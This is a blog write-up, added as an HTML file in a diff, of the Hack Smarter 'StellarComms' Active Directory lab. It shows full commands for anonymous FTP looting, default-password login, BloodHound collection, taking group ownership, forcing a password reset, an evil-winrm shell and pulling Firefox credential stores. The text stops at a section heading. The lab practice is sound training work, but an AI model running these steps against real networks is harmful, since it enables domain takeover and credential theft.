@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>StellarComms | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Hack Smarter StellarComms AD lab: anonymous FTP, default credentials, BloodHound permission paths, Firefox credentials, gMSA access, and domain compromise.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/stellarcomms-ad.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+<meta property="og:url" content="https://jennshaggy.github.io/stellarcomms-ad.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="StellarComms">
+<meta property="og:description" content="Hack Smarter StellarComms AD lab: anonymous FTP, default credentials, BloodHound permission paths, Firefox credentials, gMSA access, and domain compromise.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="StellarComms">
+<meta name="twitter:description" content="Hack Smarter StellarComms AD lab: anonymous FTP, default credentials, BloodHound permission paths, Firefox credentials, gMSA access, and domain compromise.">
+<style>.stellar-evidence{margin:2rem 0;text-align:center}.stellar-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}.stellar-evidence figcaption{margin-top:.5rem;color:var(--secondary);font-style:italic}</style>
+<style>.stellar-evidence{margin:2rem 0;text-align:center}.stellar-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}.stellar-evidence figcaption{margin-top:.5rem;color:var(--secondary);font-style:italic}</style>
+<style>.stellar-evidence{margin:2rem 0;text-align:center}.stellar-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}.stellar-evidence figcaption{margin-top:.5rem;color:var(--secondary);font-style:italic}</style>
+<style>.stellar-evidence{margin:2rem 0;text-align:center}.stellar-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}.stellarcomms-writeup .post-content p + h3{margin-top:2.5rem}</style>
+<style>.stellar-evidence{margin:2rem 0;text-align:center}.stellar-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}.stellarcomms-writeup .post-content p + h3{margin-top:2.5rem}</style>
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/penetration-testing.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single technical-writeup stellarcomms-writeup">
+<header class="post-header"><h1 class="post-title entry-hint-parent">StellarComms</h1><div class="post-description">This is my first official Hack Smarter lab. I’m deep in the mix of studying for the PNPT exam.</div></header>
+<div class="post-content">
+<h2>Objective / Scope</h2>
+<p>Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.</p>
+<h3>Initial Access</h3>
+<p>Our initial access team has successfully established a VPN tunnel into the environment. We have identified a valid username, likely belonging to a new hire or junior staff member.</p>
+<pre><code class="language-md">Valid User:
+Username: junior.analyst
+Password: Unknown</code></pre>
+<p>This is my first official Hack Smarter lab. I'm deep in the mix of studying for the PNPT exam. I thought about attempting the exam without utilizing the course materials, but why pass up the opportunity to learn what I don't know?</p>
+<p>No one knows everything, and we can all learn from each other.</p>
+<p>Into the (AD) forrest we go.</p>
+<h2>Reconnaissance</h2>
+<pre><code class="language-bash">rustscan -a $tip -- -A</code></pre>
+<p>Nmap tells us the services running on the unearthed open ports:</p>
+<pre><code class="language-bash">PORT      STATE SERVICE       REASON          VERSION
+21/tcp    open  ftp           syn-ack ttl 126 Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 09-12-25  12:29PM       &lt;DIR&gt;          Docs
+| 09-10-25  12:15PM       &lt;DIR&gt;          IT
+|_09-10-25  12:44PM       &lt;DIR&gt;          Pics
+53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-10-22 12:46:07Z)
+135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 126
+464/tcp   open  kpasswd5?     syn-ack ttl 126
+593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 126
+3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 126
+3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services</code></pre>
+<p>(Trimmed for brevity.)</p>
+<p>Eye spy Anonymous FTP.</p>
+<p>The rest of the open ports list is throwing very strong AD environment hints. We already know this is an AD challenge, but let's pretend for a few moments that we flew in blind.</p>
+<p>While there are a variety of AD attack vectors, many of them require the AD domains be added to your local machine's <code>/etc/hosts</code> file.</p>
+<p>Most people use <code>nxc</code> or the <code>sed</code> command to add domains to their <code>/etc/hosts</code> file. For whatever reason, I'm old school.</p>
+<pre><code class="language-bash">sudo nano /etc/hosts</code></pre>
+<p>Place the a comment followed by challenge's AD Domain and FQDN at the top of your IPv4 list :</p>
+<pre><code class="language-bash">#StellarComms
+&lt;MACHINE_IP&gt;     DC-STELLAR.stellarcomms.local stellarcomms.local</code></pre>
+<p>Back to our Nmap.</p>
+<p>We have multiple findings in the open ports and services list.</p>
+<p>Port 21: Anonymous FTP is the first one that caught my attention. With network access via the Machine IP, we can access a directory.</p>
+<p>Port 53: Runs DNS. This wouldn't be my first line of attack, but if most other attacks failed, DNS attacks are not out of the question.</p>
+<p>Port 80: HTTP aka we have a web server running <code>Microsoft IIS httpd 10.0</code>. Duly noted for investigation.</p>
+<p>Port 88: Kerberos is running, which can lead to some very fun attacks if other parts of the environment are not configured securely. Likely more on that later.</p>
+<p>Ports 135, 139, and 445: SMB, which can be a great attack vector for looking at network shares.</p>
+<p>Port 3268: LDAP, which is very useful for authentication.</p>
+<p><code>RDP</code> is also running. Great for remoting-in to a machine with tools like <code>xfreerdp</code>.</p>
+<h3>FTP Enumeration</h3>
+<p>We'll dig into the Anonymous FTP first. It's an easy way in, and a finding you would definitely want to document on a client's report:</p>
+<pre><code class="language-bash">ftp anonymous@stellarcomms.local</code></pre>
+<p>When the <code>Password:</code> line appears, just hit <code>Enter</code>.</p>
+<p>And we're in. Anonymous FTP access is confirmed.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/ftp-anonymous-login.png" alt="Anonymous FTP login accepted" loading="lazy"></figure>
+<p>I've said it before and I'll say it again: I appreciate how literal FTP command syntax is.</p>
+<pre><code class="language-bash">ls</code></pre>
+<p>We'll start with <code>Docs</code>:</p>
+<pre><code class="language-bash">cd Docs
+ls</code></pre>
+<p>Quite a few here. We can use the <code>get</code> command to pull them back to our local machine. We'll pull the browser policy, the user guide, a report, .</p>
+<pre><code class="language-bash">get Browser_policy.pdf
+get Stellar_UserGuide.pdf
+get LEO_2A_Report.txt</code></pre>
+<p>Those three transfers successfully landed on our machine:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/ftp-document-transfers.png" alt="Three documents retrieved from anonymous FTP" loading="lazy"></figure>
+<p>Let's go back up to the top level directory:</p>
+<pre><code class="language-bash">cd ../
+ls
+cd IT
+ls</code></pre>
+<p>Only one thing here, but it's just a Firefox setup file.</p>
+<p>It's not a custom binary, so this isn't that interesting. Let's move into the <code>Pics</code> directory:</p>
+<pre><code class="language-bash">cd ../
+cd Pics
+ls</code></pre>
+<p>Nothing aside from a handful of images here. HackSmarter firmly stands on the purposeful side of CTF curation: if you won't see it in an engagement, you won't see it in their labs.</p>
+<p>That means we don't need to go exhuming hidden text with <code>steghide</code> or anything of that nature. Holy appreciated, HackSmarter team.</p>
+<p>We can safely exit the machine:</p>
+<pre><code class="language-bash">bye</code></pre>
+<p>Note: I usually make a custom directory for each lab I do. Forgive me. I was up at dawn today. This is why a balanced life is important.</p>
+<p>Let's dig in to the files we grabbed:</p>
+<pre><code class="language-bash">open Browser_policy.pdf</code></pre>
+<p>This pdf is a bit jacked up, but there's potentially useful information in it. Firefox ESR keeps coming up, so we'll leave it here for future reference:</p>
+<pre><code class="language-bash">open Stellar_UserGuide.pdf</code></pre>
+<p>This contains very sensitive information in the form of a Default password issued upon new user account creation:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/ftp-user-guide.png" alt="ftp user guide" loading="lazy"></figure>
+<h3>Discovered Credentials</h3>
+<p><code>Default password: Galaxy123!</code></p>
+<p>I don't like to make promises I can't deliver on, especially publicly, so I'll just say it's highly likely that we just found our way in.</p>
+<p>I'm going to fire up Bloodhound now. It's not genuinely warranted yet, but I'd rather it be ready to go:</p>
+<pre><code class="language-bash">bloodhound-start</code></pre>
+<p>The default credentials will be displayed in your terminal after it successfully starts via Neo4j. If this is your first time using Bloodhound on your machine, it'll force you to change the defaults after your first sign in. Don't lose your password, but don't put it on a Post-It, either.</p>
+<h2>Gaining a Foothold</h2>
+<p>We'll set Bloodhound aside until we're ready for it.</p>
+<p>We now have a set of default credentials:</p>
+<pre><code class="language-md">Username: junior.analyst
+Password: Galaxy123!</code></pre>
+<p>We'll need our DC's address, which you can grab out of <code>/etc/hosts</code> if you don't have it handy, by running <code>sudo nano /etc/hosts</code>. Be careful not to make any unwanted changes, and use <code>CTRL</code> + <code>x</code> to exit nano.</p>
+<p>We'll use that DC address in a <code>NetExex</code> command. <code>NetExec</code> is like a proverbial Swiss Army Knife in AD pentesting. Since we know SMB is running, let's see if <code>junior.analyst</code> can access some shares:</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; --shares</code></pre>
+<p>Note: In a real client engagement, you'd have quiet a bit to redact here:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/junior-smb.png" alt="junior smb" loading="lazy"></figure>
+<p>Foothold achieved.</p>
+<h2>Initial Foothold to the AD Environment</h2>
+<pre><code class="language-bash">junior.analyst:Galaxy123!</code></pre>
+<pre><code class="language-bash">┌──(jenn㉿local)-[~]
+└─$ nxc smb DC-STELLAR.stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; --shares
+SMB         10.1.132.28     445    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.132.28     445    DC-STELLAR       [+] stellarcomms.local\junior.analyst:Galaxy123!
+SMB         10.1.132.28     445    DC-STELLAR       [*] Enumerated shares
+SMB         10.1.132.28     445    DC-STELLAR       Share           Permissions     Remark
+SMB         10.1.132.28     445    DC-STELLAR       -----           -----------     ------
+SMB         10.1.132.28     445    DC-STELLAR       ADMIN$                          Remote Admin
+SMB         10.1.132.28     445    DC-STELLAR       C$                              Default share
+SMB         10.1.132.28     445    DC-STELLAR       IPC$            READ            Remote IPC
+SMB         10.1.132.28     445    DC-STELLAR       NETLOGON        READ            Logon server share
+SMB         10.1.132.28     445    DC-STELLAR       SYSVOL          READ            Logon server share</code></pre>
+<h2>Enumeration</h2>
+<p>Glad we preemptively fired up Bloodhound. We can already run the collector via <code>NetExec</code> and retrieve the Domain information, then ingest it into Bloodhound.</p>
+<p>The syntax for the collector uses LDAP. If you're working in the same terminal we ran the first <code>nxc</code> command in, just hit your up arrow key once and adjust the command:</p>
+<pre><code class="language-bash">nxc ldap DC-STELLAR.stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; --bloodhound --collection All</code></pre>
+<p>We hit a collector mismatch error. <code>NetExec</code> is configured for BloodHound CE, but my Kali setup seems to be running legacy BloodHound. The biggest clue was running <code>bloodhound-start</code>, then seeing the <code>neo4j console</code> in my terminal prior to <code>bloodhound</code> launching in my browser.</p>
+<p>Change <code>NetExec</code> to the legacy collector only if you encounter the same situation:</p>
+<pre><code class="language-bash">cp ~/.nxc/nxc.conf ~/.nxc/nxc.conf.bak
+
+sed -Ei \
+  &#x27;s/^[[:space:]]*bh_enabled[[:space:]]*=.*/bh_enabled = True/;
+   s/^[[:space:]]*bhce_enabled[[:space:]]*=.*/bhce_enabled = False/&#x27; \
+  ~/.nxc/nxc.conf
+
+grep -E &#x27;^[[:space:]]*(bh_enabled|bhce_enabled)&#x27; ~/.nxc/nxc.conf</code></pre>
+<p>As long as we see <code>bh_enabled = True</code> and <code>bhce_enabled = False</code>, we're ready to roll:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/bloodhound-config-confirmed.png" alt="Legacy BloodHound collector settings confirmed" loading="lazy"></figure>
+<p>Now we've encountered a DNS server error:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/bloodhound-dns-error.png" alt="NetExec cannot find a domain controller without DNS server specified" loading="lazy"></figure>
+<p>That's okay. We can modify the command syntax so it resolves:</p>
+<pre><code class="language-bash">nxc ldap DC-STELLAR.stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; --bloodhound --collection All --dns-server &lt;DOMAIN_CONTROLLER_IP_HERE&gt;</code></pre>
+<p>Output:</p>
+<pre><code class="language-bash">┌──(jenn㉿local)-[~]
+└─$ nxc ldap DC-STELLAR.stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; --bloodhound --collection All --dns-server 10.1.132.28
+LDAP        10.1.132.28     389    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:None) (channel binding:No TLS cert)
+LDAP        10.1.132.28     389    DC-STELLAR       [+] stellarcomms.local\junior.analyst:Galaxy123!
+LDAP        10.1.132.28     389    DC-STELLAR       [-] Provided Neo4J credentials (neo4j:bloodhoundcommunityedition) are not valid.
+LDAP        10.1.132.28     389    DC-STELLAR       Resolved collection methods: rdp, acl, container, objectprops, dcom, trusts, session, localadmin, group, psremote
+LDAP        10.1.132.28     389    DC-STELLAR       Done in 0M 15S
+LDAP        10.1.132.28     389    DC-STELLAR       Compressing output into /home/jenn/.nxc/logs/DC-STELLAR_10.1.132.28_2026-10-23_084933_bloodhound.zip</code></pre>
+<p>Let's view our possible attack paths.</p>
+<p>You'll get a very solid visual on both the Domain Admin and Domain Admin group:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/domain-admin-path.png" alt="domain admin path" loading="lazy"></figure>
+<p>We can also see if there are any Kerberoastable users by clicking <code>All Kerberoastable users</code>.</p>
+<h3>Kerberoastable</h3>
+<p>We discovered one Kerberoastable machine account:</p>
+<pre><code>SATLINK-SERVICE$@STELLARCOMMS.LOCAL</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/kerberoastable-account.png" alt="kerberoastable account" loading="lazy"></figure>
+<p>Checking for <code>AS-REP Roastable Users</code> is a great next step. There aren't any in this environment, but keep that knowledge in your back pocket for the future.</p>
+<p>Let's see what it looks like for our pwned <code>junior.analyst</code>:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/writeowner.png" alt="WriteOwner relationship from junior.analyst to STELLAROPS-CONTROL" loading="lazy"></figure>
+<p>Not bad at all.</p>
+<p><code>junior.analyst</code> has Write permissions over the <code>STELLAROPS-CONTROL</code> group AKA they can change the group's permissions, specifically, make themselves the admin.</p>
+<p>We can even map out where we'll move either laterally or escalation-wise from <code>STELLAROPS-CONTROL</code> by clicking on <code>STELLAROPS-CONTROL</code> and seeing where their <code>Outbound Object Control maps</code>:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/force-change-password.png" alt="force change password" loading="lazy"></figure>
+<p>We can <code>ForceChangePassword</code> over <code>OPS.CONTROLLER</code> user, which is great news.</p>
+<p>Let's check <code>OPS.CONTROLLER</code>'s Outbound permissions and group memberships:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/controller-memberships.png" alt="controller memberships" loading="lazy"></figure>
+<p>No Outbound permission, but we do have 3 group memberships.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/remote-management.png" alt="remote management" loading="lazy"></figure>
+<p>This is excellent news. <code>OPS.CONTROLLER</code> is <code>MemberOf</code> (aka a member of) the <code>REMOTE MANAGEMENT</code> group, meaning it's shell o'clock via WinRM into the DC if all goes according to our developing plan of attack.</p>
+<h2>Lateral Movement and PrivEsc</h2>
+<h3>Compromising <code>STELLAROPS-CONTROL</code></h3>
+<p>Our next move will be making <code>junior.analyst</code> the owner of <code>STELLAROPS-CONTROL</code>.</p>
+<pre><code class="language-bash">impacket-owneredit -action write -new-owner &#x27;junior.analyst&#x27; -target &#x27;stellarops-control&#x27; &#x27;stellarcomms.local&#x27;/&#x27;junior.analyst&#x27;:&#x27;Galaxy123!&#x27;</code></pre>
+<p>Now we need to add <code>junior.analyst</code> to the group. I know it seems a bit counterintuitive, but stick with me.</p>
+<p>We'll configure this for our environment (don't miss that the <code>-dn</code> after <code>-target</code> is deleted):</p>
+<pre><code class="language-bash">impacket-dacledit -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;junior.analyst&#x27; -target &#x27;stellarops-control&#x27; &#x27;stellarcomms.local&#x27;/&#x27;junior.analyst&#x27;:&#x27;Galaxy123!&#x27;</code></pre>
+<p>Next, we'll add <code>junior.analyst</code> to the <code>stellarops-control</code> group.</p>
+<pre><code class="language-bash">bloodyAD --host 10.1.132.28 -d stellarcomms.local -u &#x27;junior.analyst&#x27; -p &#x27;Galaxy123!&#x27; add groupMember STELLAROPS-CONTROL junior.analyst</code></pre>
+<pre><code class="language-bash">net rpc group members &quot;stellarops-control&quot; -U &#x27;stellarcomms.local/junior.analyst%Galaxy123!&#x27; -S 10.1.132.28</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/group-members.png" alt="group members" loading="lazy"></figure>
+<p>The last step we'll take to compromise <code>OPS.CONTROLLER</code> is leverage the <code>ForceChangePassword</code> permissions of <code>STELLAROPS-CONTROL</code> to change <code>OPS.CONTROLLER</code>'s password via <code>net rpc</code>.</p>
+<p>During real world engagements, it's proper procedure to reach out to the client once you've compromised a user at the level of <code>OPS.CONTROLLER</code>. More often than not, the client will create you a new user account with identical permission to <code>OPS.CONTROLLER</code>.</p>
+<pre><code class="language-bash">net rpc password &quot;ops.controller&quot; &#x27;LetMeIn123!&#x27; -U &#x27;stellarcomms.local/junior.analyst%Galaxy123!&#x27; -S 10.1.132.28</code></pre>
+<p>The command returned no output.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/controller-password-reset.png" alt="controller password reset" loading="lazy"></figure>
+<p>Let's verify via <code>nxc</code>:</p>
+<pre><code class="language-bash">nxc smb DC-STELLAR.stellarcomms.local -u &#x27;ops.controller&#x27; -p &#x27;LetMeIn123!&#x27; --shares</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/controller-login-check.png" alt="controller login check" loading="lazy"></figure>
+<p>The <code>OPS.CONTROLLER</code> user is confirmed compromised. The user's password has been changed.</p>
+<p>New Credentials: <code>OPS.CONTROLLER:LetMeIn123!</code></p>
+<p>Let's dive in for the user flag.</p>
+<pre><code class="language-bash">evil-winrm -i 10.1.132.28 -u &#x27;ops.controller&#x27; -p &#x27;LetMeIn123!&#x27;</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/controller-winrm-shell.png" alt="controller winrm shell" loading="lazy"></figure>
+<p>We successfully have a shell.</p>
+<pre><code class="language-PowerShell">ls
+cd ../
+cd Desktop
+ls</code></pre>
+<p>There it is:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/user-flag-file.png" alt="user flag file" loading="lazy"></figure>
+<pre><code class="language-PowerShell">type user.txt</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/user-flag-redacted.png" alt="user flag redacted" loading="lazy"></figure>
+<p>Our end goal is to compromise the DC, which will require us to have some way to compromise <code>SATLINK-SERVICE$</code>. Then, we utilize what's available to take over the DC.</p>
+<p>Back to <code>ops.controller</code>'s shell session.</p>
+<pre><code class="language-PowerShell">ls</code></pre>
+<p>There's one layer of StellarComms technology stack that keep surfacing: Mozilla Firefox. We see a Firefox setup file on the <code>ops.controller</code> desktop. We also found a browser config file via Anonymous FTP, as well as the mentions of Firefox in the PDFs pulled from the same FTP access.</p>
+<p>Using a web browser on a DC is not a great idea, but that's the world we live in. It does happen.</p>
+<p>Let's see what users exist on this machine:</p>
+<pre><code class="language-PowerShell">cd ../
+dir</code></pre>
+<p>No other users.</p>
+<p>Let's go to the C:\ drive.</p>
+<pre><code class="language-PowerShell">cd ../
+dir</code></pre>
+<p>We want look for any non-standard Program Files. They reveal vulnerabilities usable for local PrivEsc paths.</p>
+<pre><code class="language-PowerShell">cd &quot;Program Files&quot;
+dir</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/program-files.png" alt="Program Files listing with Oracle and Mozilla Firefox" loading="lazy"></figure>
+<p>Our best findings here are Oracle and Mozilla Firefox. Noted.</p>
+<p>Let's check the user's privileges:</p>
+<pre><code class="language-PowerShell">whoami /priv</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/whoami-privileges.png" alt="ops.controller privilege listing" loading="lazy"></figure>
+<p>Not much to write home about. We could add a Workstation to the domain to abuse, but that's probably not what's intended here.</p>
+<p>The most obvious intended path is finding credentials in Firefox. Let's explore that instinct.</p>
+<pre><code class="language-PowerShell">cd C:\
+cd Users
+dir
+cd ops.controller
+dir -force</code></pre>
+<p>Running the <code>dir -force</code> command shows us the hidden files:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/hidden-appdata.png" alt="hidden appdata" loading="lazy"></figure>
+<p><code>AppData</code> is typically where you find browser data stashed.</p>
+<pre><code class="language-PowerShell">cd AppData
+dir
+cd Local</code></pre>
+<p><code>Local</code> is where we're most likely to find Mozilla data, and that's exactly where it is:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-local.png" alt="firefox local" loading="lazy"></figure>
+<pre><code class="language-PowerShell">cd Mozilla
+dir
+cd Firefox
+dir
+cd Profiles
+dir</code></pre>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-profiles.png" alt="firefox profiles" loading="lazy"></figure>
+<p>The <code>esr</code> stands for <code>Extended Release Default</code>.</p>
+<p>Let's explore both:</p>
+<pre><code class="language-PowerShell">cd 67wyfsfs.default
+dir</code></pre>
+<p>It's absolutely empty. On to the next.</p>
+<pre><code class="language-PowerShell">cd ../
+dir
+cd v8mn7ijj.default-esr
+dir</code></pre>
+<p>This profile is not empty:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-local-profile.png" alt="firefox local profile" loading="lazy"></figure>
+<p>Let's see if we can find where the credentials are stored. We'll go ahead and ask a search engine.</p>
+<p>If I'm not mistaken, I believe we need to go from <code>Local</code> to <code>Roaming</code>.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-roaming-reference.png" alt="firefox roaming reference" loading="lazy"></figure>
+<p>Yes indeed. We do.</p>
+<pre><code class="language-PowerShell">cd ../../../../../../../
+cd AppData
+cd Roaming
+dir</code></pre>
+<p>There we go.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-roaming.png" alt="firefox roaming" loading="lazy"></figure>
+<pre><code class="language-PowerShell">cd Mozilla
+dir
+cd Firefox
+dir
+cd Profiles
+dir
+cd v8mn7ijj.default-esr
+dir</code></pre>
+<p>I believe these two are what we're looking for:</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-profile.png" alt="firefox profile" loading="lazy"></figure>
+<p><code>logins.json</code> holds the encrypted usernames and passwords. <code>key4.db</code> is the database keys needed to decrypt the passwords.</p>
+<p>We'll use <code>WinRM</code> to pull both of them over to our local machine:</p>
+<pre><code class="language-PowerShell">download logins.json
+download key4.db</code></pre>
+<p>Beautiful.</p>
+<figure class="stellar-evidence"><img src="/images/stellarcomms-ad/firefox-files-downloaded.png" alt="firefox files downloaded" loading="lazy"></figure>
+<h3>Compromising <code>astro.researcher</code></h3>
